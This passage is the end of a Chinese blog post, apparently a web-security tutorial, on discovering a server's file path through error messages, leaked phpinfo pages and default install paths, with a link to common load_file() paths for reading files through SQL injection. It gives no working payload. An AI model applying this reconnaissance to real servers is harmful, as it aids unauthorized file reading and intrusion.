     <img alt="" height="304" src="https://i-blog.csdnimg.cn/direct/ee59ee9a7dac4dca8a901e278225d142.png" width="1317"/>
    </p>
    <p>
     <img alt="" height="1177" src="https://i-blog.csdnimg.cn/direct/7f8cabeb39c54ee480a50f8e20e16828.png" width="2069"/>
    </p>
    <p>
     2、报错显示获取路径，容错显示。
    </p>
    <p>
     <img alt="" height="504" src="https://i-blog.csdnimg.cn/direct/4b57180ab323488ab9712b65783c5a66.png" width="1651"/>
    </p>
    <p>
     3、
     <strong>
      phpinfo页面泄漏
     </strong>
    </p>
    <p>
     <img alt="" height="186" src="https://i-blog.csdnimg.cn/direct/5850e449209842b691286297fbc23321.png" width="698"/>
    </p>
    <p>
     <img alt="" height="1454" src="https://i-blog.csdnimg.cn/direct/d37ded1b203d4d67a99a9fec2a36b167.png" width="2544"/>
    </p>
    <p>
     如果不知道路径思路：
     <br/>
     用常见的默认的中间件，数据库等安装路径读取有价值信息
    </p>
    <p>
     <strong>
      load_file()常用路径：
     </strong>
     <a href="https://blog.csdn.net/god_7z1/article/details/8725541" title="load_file()常用路径_load file 目录-CSDN博客">
      load_file()常用路径_load file 目录-CSDN博客
     </a>
    </p>
    <p>
     本文章借用思路：
    </p>
    <p>
     <a href="https://blog.csdn.net/wushangyu32335/article/details/136197586?spm=1001.2014.3001.5502" title="https://blog.csdn.net/wushangyu32335/article/details/136197586?spm=1001.2014.3001.5502">
      https://blog.csdn.net/wushangyu32335/article/details/136197586?spm=1001.2014.3001.5502
     </a>
    </p>
    <p>
     本文章由李豆豆喵和番薯小羊卷共同完成。
    </p>
   </div>
  </div>
 </article>
 <p alt="68747470733a2f2f62:6c6f672e6373646e2e6e65742f6d305f37343933303532392f:61727469636c652f64657461696c732f313436313334353036" class_="artid" style="display:none">
 </p>
</div>


